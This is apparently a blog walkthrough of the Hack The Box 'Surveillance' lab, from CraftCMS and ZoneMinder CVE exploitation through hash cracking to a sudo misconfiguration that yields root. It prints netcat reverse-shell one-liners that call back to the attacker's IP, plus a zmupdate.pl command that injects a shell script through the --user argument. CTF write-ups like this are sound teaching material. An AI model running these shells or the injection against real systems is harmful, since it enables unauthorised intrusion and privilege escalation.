---
layout: post
title: "HTB Surveillance: Walkthrough"
date: 2024-11-17 10:00:00 +0000
categories: [HTB]
tags: [HTB, CVE, Sudo, Port Forwarding]
image:
  path: https://raw.githubusercontent.com/partyh4t/partyh4t.github.io/refs/heads/main/assets/posts/Headers/HTB.png
---

![image](https://github.com/user-attachments/assets/51ff08a4-0cf0-4452-90c9-98c0f45d4cf3)

We start off with exploiting a CVE in a vulnerable CraftCMS running on the target webserver. This is then followed by a series of 3 privilege escalations. The first requiring us to download a backup SQL db `.zip` file containing an old users hash, which we can crack to gain SSH into the machine. The second involves another CVE on a `ZoneMinder` instance running on the targets localhost. Finally, we can abuse a misconfiguraton in our sudo privileges to gain access as the root user. 

## 0) Machine Overview
1. [Scans](#1-scans)
2. [Web Enumeration](#2-web-enumeration)
4. [Privilege Escalation](#3-privilege-escalation)
5. [Privilege Escalation 2](#4-privilege-escalation-2)
6. [Privilege Escalation 3](#5-privilege-escalation-3)


### 1) Scans

```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)

80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/

8181/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)

8888/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
```


## 2) Web Enumeration

Seems we're dealing with CraftCMS:

![image](https://github.com/user-attachments/assets/dde079b4-381f-43ce-8ae1-50cacb407155)


With a bit of research, we come across a [PoC](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226
) for a CVE that happened recently.

If we exploit it using this script, we're able to get a "web-shell". (Just to note, you'll have to have Burpsuite running as the exploit connect to your proxy at first for this script to work.)

![image](https://github.com/user-attachments/assets/0310a88c-5d84-4377-89fb-b2bc6d41ab78)

Now that we're in, we need to find a way to leverage this web-shell to get a full reverse shell or an SSH connection. 

After various attempts to catch the shell, this command worked the best, giving us a very nice shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.14 4444 >/tmp/f
```
![image](https://github.com/user-attachments/assets/8def25ae-0984-4f66-8fb6-a8727306224f)

## 3) Privilege Escalation

Now to privilege escalate.

Now before I try loading `linPEAS` or anything like that onto the machine, I like to manually enumerate a little bit and check for low-hanging fruit and look through config files.

- No interesting SUID files.
- Cant access any of the other users home directories.
- We have 2 users with home directories.
  
![image](https://github.com/user-attachments/assets/d07fd683-6660-42a5-9846-b881942e7909)

Lets start looking through the CMS files and see if we can find anything interesting....

![image](https://github.com/user-attachments/assets/23a6d9fe-328e-4484-9340-80c998dbacc1)

Hmm a `.env` file. Thats definitely interesting.

![image](https://github.com/user-attachments/assets/5ccce8c0-2707-4da5-9cf1-d3a77542fc43)


Seems theres a MySQL DB running on the host.. and potentially another webserver on port 8080? We'll have to check that out afterwards, maybe through a portforward.

![image](https://github.com/user-attachments/assets/417449fb-1002-4cad-8d3a-392dd3003ed8)

I tried connecting to the DB, but it basically just kept hanging every time. So I just decided to upload a `metty.elf` file and get a meterpreter shell.

![image](https://github.com/user-attachments/assets/b5018a3b-fc4a-4744-baf3-aa4df1cbc262)

Now we are able to successfully access the DB.

![image](https://github.com/user-attachments/assets/d786e72b-834b-4b02-85f7-87ca2094357d)

![image](https://github.com/user-attachments/assets/fc56c864-00a2-43fc-bd25-5d65e96130af)

![image](https://github.com/user-attachments/assets/479286b0-5e4d-4441-972f-52317aa4cf45)

As we can see, there is a `bcrypt` hash belonging to the admin user, who also seems to be Matthew. Lets try hacking that hash offline, although I'm not too confident.

After a while of trying to crack it, it seems like this wasn't the intended route.

After some more enumeration, we find a backup `.zip` file.

![image](https://github.com/user-attachments/assets/3f4e8c25-9731-4767-b891-85ed490b8028)

Lets take that offline and take a look.

![image](https://github.com/user-attachments/assets/b8f90219-f837-4db0-be3a-bf217f2326d0)

Jackpot. Another hash for Matthew, which seems to be SHA-256. Now to crack it.

![image](https://github.com/user-attachments/assets/b9a300b0-f08c-4870-bc89-3e0c7ab87d52)

Lets try SSHing into the machine as matthew.

![image](https://github.com/user-attachments/assets/63b26603-fdc0-4447-8545-2dd7f91e765f)

![image](https://github.com/user-attachments/assets/b52f28ed-47dd-42d3-9794-643da79160dd)

## 4) Privilege Escalation 2

Now that we're on matthew, we can again check for low-hanging fruit. In this case, I didn't find any in this case, so lets run `linpeas`.

![image](https://github.com/user-attachments/assets/cb4f81ed-cd1b-440c-b054-d6d6d7364dff)

Interesting. I checked GTFOBins to see if there was a quick win, as I'm not that familiar with abusing capabilities.

![image](https://github.com/user-attachments/assets/aaaae3c0-8ff7-4355-9a67-733a1e3a302b)

Lets give it a try:

![image](https://github.com/user-attachments/assets/3d6cc604-66b8-4c29-acd0-ab33422c6273)

So it seems like because the python3 file is owned by `zoneminder`, we cant run it unless we are that user. _(Note: I'm writing this after completing the box. I think that the reason it didn't work was because that capability is basically like a SUID, and because the file is owned by zoneminder. Either way, I tried to specify the UID of zoneminder's, but it kept giving me access denied.)_

One other thing to note is that, in our linpeas output, it mentions something about that server running on 8080.

![image](https://github.com/user-attachments/assets/ccd58c3e-bfe0-4859-a2af-88a3b5049089)

Seems like its running PHP within an nginx webserver. Lets port forward now. (This command will allow us to access port 8080 on our local machines port 1234)

![image](https://github.com/user-attachments/assets/3c5db412-66dd-4a85-ade2-3c8acf7ae740)

![image](https://github.com/user-attachments/assets/de018b9d-523e-4b25-8967-b9c14aff08f6)

Now if we go back and look at the zoneminder.conf file a little more, we'll notice that the webroot is at:

![image](https://github.com/user-attachments/assets/f1cb747c-8d1b-412a-963e-5f6787567b5a)

Interesting, lets check out that `db` folder.

![image](https://github.com/user-attachments/assets/051fdb71-95f7-4f18-91cb-a76da4816f5d)

So it seems its showing a list of version updates that were made to the zoneminder application. Seems like its currently running `v1.36.9` or some version along those lines. Lets check for a CVE.

![image](https://github.com/user-attachments/assets/02e64d67-59a7-499f-bcaa-ef45807846cf)

Looks like our version would fall within that range, so we can try looking for a PoC, which in this case, there happen to be a few, so I'll be using [this](https://github.com/rvizx/CVE-2023-26035/tree/main) one.

![image](https://github.com/user-attachments/assets/88f500bb-345c-4220-825e-4517e9b0b431)

![image](https://github.com/user-attachments/assets/5c9ff9ee-c96b-44ce-8d96-2135de2543ea)

## 5) Privilege Escalation 3

Now that we're zoneminder, our final goal is close within reach. We can run a quick `sudo -l` and see if there is a quick win, hopefully without requiring a password.

![image](https://github.com/user-attachments/assets/3d8ee58d-48ee-4893-b7f0-78030ae951e0)

So after quite a bit of research and messing with the various `zm*.pl` files there are, we can leverage `zmupdate.pl` to basically pass a script to get executed as the username in one of the command parameters, and we'll need to use a password that we can find in a database.php file: (Note: don't think the password is actually needed for this exploit)

![image](https://github.com/user-attachments/assets/67c36cf1-dc2e-45ca-bafa-42b486092abf)

So the final command will look like this:
```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/revshell.sh)' --pass=ZoneMinderPassword2023
```

I had to try multiple reverse shells, the one that worked for me was:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.14 5555 >/tmp/f`

![image](https://github.com/user-attachments/assets/e0602271-165d-45c0-a0c3-3caa3c2b334f)



